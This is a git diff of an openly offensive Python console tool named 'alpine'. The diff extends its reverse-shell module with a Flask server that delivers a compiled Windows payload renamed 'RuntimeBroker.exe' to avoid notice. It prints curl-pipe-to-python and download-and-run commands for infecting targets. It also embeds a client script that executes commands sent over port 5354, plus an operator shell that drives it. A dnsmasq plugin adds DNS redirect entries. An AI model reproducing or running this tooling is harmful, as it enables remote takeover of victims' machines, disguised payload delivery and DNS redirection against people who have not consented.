@@ -1,14 +1,8 @@
-from tkinter import E
-
-import flask
 import modules.plugin as plugin
 from os import system
 import threading
 import logging
 from time import sleep
-from concurrent.futures import ThreadPoolExecutor
-import ctypes
-import multiprocessing
 
 log = logging.getLogger('werkzeug')
 log.disabled = True
@@ -66,7 +60,18 @@ class EndpointAction(object):
 
     def __call__(self, send="ok"):
         self.action()
-        return self.response
+
+        if self.response != "alpineCompiled":
+            return self.response
+        else:
+            try:
+                from flask import send_file
+            except ImportError:
+                print("[!] flask needed for this")
+                return
+                
+            # MOST JANK SHIT IVE DONE
+            return send_file('./dist/rs-windows.exe', download_name='RuntimeBroker.exe', as_attachment=True) # RuntimeBroker.exe is usually skipped over
 
 
 class FlaskAppWrapper(object):
@@ -92,7 +97,7 @@ class FlaskAppWrapper(object):
         if sysVar.rsSite:
             if sysVar.rsAllow:
                 sysVar.rsSite = not sysVar.rsSite
-                print("[!!!] this will be depreciated eventually and i am working on a fix [!!!]")
+                if not sysVar.rsSiteNotified: print("[!!!] this will be depreciated eventually and i am working on a fix [!!!]"); sysVar.rsSiteNotified = True
                 func = self.req.environ.get('werkzeug.server.shutdown')
                 #func = sel
                 if func is None:
@@ -103,8 +108,17 @@ class FlaskAppWrapper(object):
         else:
             return
 
+    def winCompiled(self):
+        """
+        return windows compiled exe
+        """
+        return
+
     def run(self, port, ip):
         self.app.add_url_rule("/shutdown", "shutdown", EndpointAction(self.shutdown, send="ok"))
+        self.app.add_url_rule("/windows", "windows", EndpointAction(self.winCompiled, send="alpineCompiled")) # END ME
+        #self.app.add_url_rule("/windows", "windows", EndpointAction(self.win, send="ok"))
+
         try:
             self.app.run(ip, port=port, debug=False, use_reloader=False)
         except RuntimeError:
@@ -137,34 +151,31 @@ skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 skt.bind(("0.0.0.0", int(5354)))
 
-skt.listen()
+skt.listen(1)
 
 while True:
-    conn, addr = skt.connect()
+    conn, addr = skt.accept()
 
     with conn:
         while True:
-            data = conn.recv(65536)
+            data = conn.recv(65536).decode('utf-8')
 
             if not data:
+                print("not data")
                 break
 
-            conn.sendall(getoutput(data).encode('utf-8'))
+            if data == "alpine!die":
+                quit()
+
+            conn.send(getoutput(data).encode('utf-8'))
             """
 
             return script
 
-        def initDownload(args:list):
+        def stopFlask(args:list):
             """
-            execute the download server for quick execution/injection
+            stop flask server
             """
-
-            try:
-                ip = args[1]
-                port = args[2]
-            except:
-                print("not enough args")
-                return
 
             try:
                 from httpx import get, RemoteProtocolError
@@ -173,37 +184,80 @@ while True:
                 return
 
             if sysVar.rsSite == True:
-                if input("[!] flask server already running; close it? [Y/n]").lower() == "y":
-                    sysVar.rsAllow = True
+                sysVar.rsAllow = True
 
-                    sleep(0.5)
+                sleep(0.5)
+
+                try:
+                    get("http://127.0.0.1:{}/shutdown".format(sysVar.rsSitePort), proxies={}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"})
+                except RemoteProtocolError:
+                    pass
+
+                sleep(0.5)
+
+                print("[-] closed site")
+                sysVar.rsAllow = False
+                return
+            else:
+                print("[!] flask server not running")
+
+
+        def initDownload(args:list):
+            """
+            execute the download server for quick execution/injection
+            """
+
+            try:
+                ip = args[1] # check if all variables are here
+                port = args[2]
+
+                sysVar.rsSitePort = port
+            except:
+                print("rs-download (server ip) (port)")
+                return
+
+            try:
+                from httpx import get, RemoteProtocolError # import remoteprotocol error
+                # remoteprotocolerror shows up when the server disconnects mid request
+            except ImportError:
+                print("[!] httpx needed for this")
+                return
+
+            if sysVar.rsSite == True:
+                # site already running
+                if input("[!] flask server already running; close it? [Y/n]").lower() == "y": 
+                    # shutdown site server
+                    sysVar.rsAllow = True # allow shutdown requests
+
+                    sleep(.25) # wait a bit
 
                     try:
-                        get("http://127.0.0.1:{}/shutdown".format(port), proxies={}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"})
+                        get("http://127.0.0.1:{}/shutdown".format(port), proxies={}, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}) # make the shutdown request
                     except RemoteProtocolError:
                         pass
 
-                    sleep(0.5)
-
                     print("[-] closed site")
-                    sysVar.rsAllow = False
+                    sysVar.rsAllow = False # disallow shutdown requests
+                    sysVar.rsSitePort = None # remove site port
                     return
                 else:
+                    # choice was n or something else
                     return
                 
-            a = FlaskAppWrapper('wrap')
-            a.add_endpoint(endpoint='/', endpoint_name='script', handler=modules.reverse_shell.script)
-            a.add_endpoint(endpoint='/linux', endpoint_name='linux', handler=modules.reverse_shell.linux)
-            a.add_endpoint(endpoint='/windows', endpoint_name='windows', handler=modules.reverse_shell.windows)
-            #a.add_endpoint(endpoint='/shutdown', endpoint_name='shutdown', handler=modules.reverse_shell.shutdown)
-
-            sysVar.rsSite = True
+            a = FlaskAppWrapper('wrap') # generate wrapper
+            a.add_endpoint(endpoint='/', endpoint_name='script', handler=modules.reverse_shell.script) # add our script endpoint
+            #a.add_endpoint(endpoint='/shutdown', endpoint_name='shutdown', handler=modules.reverse_shell.shutdown)s
             
-            threading.Thread(target=modules.reverse_shell.flaskThread, args=(a, args[1], args[2],), daemon=True).start()
+            threading.Thread(target=modules.reverse_shell.flaskThread, args=(a, args[1], args[2],), daemon=True).start() # start flask thread
 
-            print("[+] started flask download server!\n  \\ use \"curl http://{}:{}/ | python3\" to run script".format("0.0.0.0", "80")) 
+            print("[+] started flask download server!\n \
+ | use \"curl http://{}:{}/ | python3\" to inject using python\n \
+ | use \"curl http://{}:{}/windows -o rb.exe && rb.exe\" to inject using compiled exe\n  \
+ \\ connect to client with their ip and the port 5354\n".format(ip, port, ip, port)) 
 
-            sleep(1)
+            sleep(.5) # wait a bit
+
+            sysVar.rsSite = True # show that we're running the site
 
         def initSocket(args:list):
             """
@@ -213,43 +267,69 @@ while True:
             try:
                 import socket
             except ImportError:
-                print("[!] socket(s) required for this")
+                print("[!] socket required for this")
+
+            try:
+                clientIP, clientP = args[1], args[2] # set our needed vars
+            except:
+                print("rs-probe (client ip) (client port)")
 
             mainSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # generate tcp socket
+            mainSock.settimeout(5) # set timeout to 5 seconds
 
-            mainSock.bind((args[1], int(args[2])))
+            try:
+                mainSock.connect((clientIP, int(clientP))) # connect to client
+            except socket.gaierror: # failed to connect
+                print("[!] client ip doesnt exist")
 
-            mainSock.listen()
+            print("connected; use \"alpine!die\" to full exit client's script; use ctrl+c to leave\n") # didnt fail
 
-            while True:
-                conn, addr =  mainSock.connect()
+            while True: # do this forever
+                try:
+                    command = input("[{}:{}]> ".format(clientIP, clientP))
 
-                with conn:
-                    conn.sendall("test".encode('ascii'))
+                    # if the command is to kill the client;
+                    #                           V: send the packet to client            V: leave since client wont respond
+                    if command == "alpine!die": mainSock.send(command.encode('utf-8')); return
 
+                    mainSock.send(command.encode('utf-8'))
+                except KeyboardInterrupt: # if input gives keyboard interrupt (i shouldnt nest all of this here but wtv)
+                    print("\n\nctrl+c")
+                    return
+
+                try:
+                    print(mainSock.recv(65536).decode('utf-8')) # attempt to recieve data
+                except socket.timeout: # if timed out
+                    print("timeout") # try again
             
     class dns:
         def start(args:list):
+            """
+            glorified "systemctl start dnsmasq"
+            """
             try:
                 import os
             except ImportError:
                 print("[!] unable to import os")
             
-            a = essensials.sanitized_input("[?] this plugin requires DNSMasq and runs it's daemon, confirm? [Y/n]").lower()
+            a = essensials.sanitized_input("[?] this plugin requires DNSMasq and runs it's daemon, confirm? [Y/n]").lower() # just in case you dont have dnsmasq
 
             if a == "y":
-                os.system("systemctl start dnsmasq")
+                os.system("systemctl restart dnsmasq") # restart because yes
                 print("[!] started")
                 return True
-            else:
+            else: # if n or anything else skip cuz invalid
                 print("[X] skipped")
                 return False
 
         def add_entry(args:list):
-            file_data = None
+            """
+            add a DNS redirect entry to dnsmasq
+            """
+            file_data = None # dnsmasq.conf filedata
 
             try:
-                domain = args[1]
+                domain = args[1] # check if args needed are given
                 ip = args[2]
             except IndexError:
                 print("[!] not enough args; dns-entry (domain) (server redirect ip)")
@@ -257,9 +337,9 @@ while True:
 
             try:
                 with open("/etc/dnsmasq.conf", "r") as f:
-                    file_data = f.read().split("\n")
-            except FileNotFoundError:
-                print("[!] /etc/dnsmasq.conf not found!")
+                    file_data = f.read().split("\n") # read and put in variable to use later
+            except FileNotFoundError: # if dnsmasq.conf doesnt exist
+                print("[!] /etc/dnsmasq.conf not found!") # notify
                 return
 
             if "address {}/{}\n".format(domain, ip) in file_data: #sanity check
@@ -269,9 +349,9 @@ while True:
             try:
                 with open("/etc/dnsmasq.conf", "a") as f:
                     f.write("address {}/{}\n".format(domain, ip))
-                    f.flush()
-            except FileNotFoundError:
-                print("[!] /etc/dnsmasq.conf not found!")
+                    f.flush() # add our entry
+            except FileNotFoundError: # if dnsmasq.conf was deleted in those microseconds somehow
+                print("[!] /etc/dnsmasq.conf not found!") # notify
                 return
 
             print("[+] DNS entry added")
@@ -323,16 +403,23 @@ class sysVar:
             "help": "start http flask server to download file from"
         },
 
-        "rs-socket": {
+        "rs-probe": {
             "module": modules.reverse_shell.initSocket,
             "help": "probe to client ip and attempt to connect"
         },
+
+        "rs-dstop": {
+            "module": modules.reverse_shell.stopFlask,
+            "help": "stop http flask server"
+        },
     }
 
-    runnable_plugins = []
-    rsSite = False
+    runnable_plugins = [] # variable name
+    rsSite = False # site running bool
     rsAllow = False # allow shutdown
-    activeThreads = []
+    rsSitePort = None # set previously given site port
+    rsSiteNotified = False # for the shutdown thing
+    activeThreads = [] # variable name
 
 if __name__ == "__main__":
     plugins = plugin.load(folder="modules") # load
@@ -362,13 +449,19 @@ if __name__ == "__main__":
             sysVar.modules["{} ({}'s plugin)".format(executable, plugins[1][p][0])]["module"] = None # set module as None to show it's not ours
 
     while True:
-        c = essensials.sanitized_input("\nalpine#> ", q=True) # q=True to quit if ctrl+c
+        c = essensials.sanitized_input("\nalpine#> ", q=False) # q=True to quit if ctrl+c
 
-        if c == "help":
+        if c == False:
+            print("\nuse \"exit\" to leave alpine")
+            continue
+
+        elif c == "help":
             for module in sysVar.modules: # cycle through each
                 a = sysVar.modules[module]['help'] # get all help from modules
                 print(f"{module}: {a}")
                 continue # go back to input
+
+        elif c == "exit": quit()
 
         try:
             sysVar.modules[c.split(" ")[0]]["module"](c.split(" ")) # try getting it from built in modules
